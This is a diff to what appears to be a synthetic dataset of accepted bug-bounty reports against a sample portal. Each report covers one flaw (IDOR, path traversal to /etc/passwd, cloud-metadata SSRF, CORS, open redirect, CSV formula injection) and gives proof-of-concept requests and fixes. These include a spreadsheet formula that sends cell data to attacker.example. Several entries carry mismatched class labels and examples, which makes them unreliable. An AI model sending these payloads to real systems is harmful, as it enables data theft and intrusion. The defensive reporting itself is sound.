+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.waldlicht-bildung.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12304,7 +12399,8 @@
           "offset": "3d 5h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.waldlicht-bildung.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12436,7 +12532,8 @@
           "offset": "4d 20h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.waldlicht-bildung.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12532,7 +12629,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.waldlicht-bildung.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12680,7 +12778,8 @@
           "offset": "6d 1h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.waldlicht-bildung.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12821,7 +12920,8 @@
           "offset": "1d 22h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12927,7 +13027,8 @@
           "offset": "5d 15h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.waldlicht-bildung.foo/import`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13079,7 +13180,8 @@
           "offset": "5d 14h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.waldlicht-bildung.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13247,7 +13349,8 @@
           "offset": "6d 4h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.waldlicht-bildung.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13402,7 +13505,8 @@
           "offset": "3d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.waldlicht-bildung.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13549,7 +13653,8 @@
           "offset": "2d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.waldlicht-bildung.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13725,7 +13830,8 @@
           "offset": "8d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.waldlicht-bildung.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13865,7 +13971,8 @@
           "offset": "6d 9h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.waldlicht-bildung.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14000,7 +14107,8 @@
           "offset": "4d 14h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.waldlicht-bildung.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14141,7 +14249,8 @@
           "offset": "4d 10h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14304,7 +14413,8 @@
           "offset": "5d 8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14464,7 +14574,8 @@
           "offset": "8d 9h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.waldlicht-bildung.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14578,7 +14689,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.waldlicht-bildung.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14706,7 +14818,8 @@
           "offset": "5d 17h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.waldlicht-bildung.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14805,7 +14918,8 @@
           "offset": "4d 12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.waldlicht-bildung.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14935,7 +15049,8 @@
           "offset": "21h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15087,7 +15202,8 @@
           "offset": "2d 2h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.waldlicht-bildung.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15199,7 +15315,8 @@
           "offset": "4h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.waldlicht-bildung.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15391,7 +15508,8 @@
           "offset": "8d",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.waldlicht-bildung.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
